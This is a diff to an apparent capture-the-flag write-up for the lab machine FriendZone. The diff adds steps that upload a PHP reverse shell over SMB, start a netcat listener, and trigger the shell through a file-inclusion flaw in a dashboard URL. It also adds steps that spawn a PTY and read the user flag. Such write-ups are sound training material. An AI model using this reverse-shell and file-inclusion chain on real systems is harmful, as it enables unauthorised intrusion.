@@ -212,16 +212,49 @@ smbclient \\\\10.10.10.123\\Development -U admin
 Password for [WORKGROUP\admin]:
 Try "help" to get a list of possible commands.
 smb: \> put r_shell
-putting file r_shell as \r_shell (1.0 kb/s) (average 1.0 kb/s)
+putting file php-reverse-shell as \php-reverse-shell (1.0 kb/s) (average 1.0 kb/s)
 smb: \> 
+```
+
+
+**Start Netcat Listener**
+```
+nc -nlvp 1234
 ```
 
 **Execute Reverse Shell**
 
 ```
-https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/r_shell
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
 ```
 
+**Shell Acquired**
+```
+nc -nlvp 1234
 
+listening on [any] 1234 ...cd /
+connect to [10.10.14.46] from (UNKNOWN) [10.10.10.123] 36522
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 04:01:36 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
 
+**Get User Flag**
+
+Escape limited shell
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+```
+www-data@FriendZone:/$ find /home/friend -name *.txt 2>/dev/null
+/home/friend/user.txt
+www-data@FriendZone:/$ cat /home/friend/user.txt 
+f61334c76f61015bf617a7410732063b
+www-data@FriendZone:/$ 
+
+```
 
